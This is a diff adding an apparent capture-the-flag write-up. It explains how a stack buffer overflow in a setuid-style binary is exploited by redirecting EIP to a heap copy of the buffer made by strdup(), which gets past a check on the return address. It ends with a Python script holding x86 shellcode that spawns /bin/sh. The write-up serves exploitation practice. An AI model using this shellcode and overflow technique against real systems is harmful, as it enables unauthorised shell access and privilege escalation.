@@ -1,0 +1,34 @@
+We found a binary in the home directory executed as level3.
+We can decompile it.
+
+Buffer address starts at 0xbffff6dc.
+Buffer address ends at 0xbffff728.
+EIP is saved at address 0x0bffff72c.
+
+We were able to inject shellcode inside the buffer but now we hit the condition.
+The condition `if ((unaff_retaddr & 0xb0000000) == 0xb0000000)` checks if we
+have overwritten the `EIP` register with an address starting with `0xb`. If it
+is the case, it prints the address and exit without restoring our overwritten
+`EIP`. So now we need to bypass this check.
+
+We tried to write our shellcode at an address after 0xbxxxxxx but our binary
+cannot access this memory area.
+
+After some research, we saw that our buffer is copied on heap through
+``strdup()`` function call.
+To bypass the check, we can point `EIP` register to our malloc'ed buffer instead
+of our stack buffer. It worked !
+
+```python
+#! /usr/bin/env python
+
+import struct
+
+SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+PREFIX = "\x00" * (80 - 4 - 4 - len(SHELLCODE))
+EBP = "BBBB"
+EIP = struct.pack("I", 0x0804a008)
+
+print SHELLCODE + PREFIX + "\x00\x00\x00\x00" + EBP + EIP + "\x00"
+```
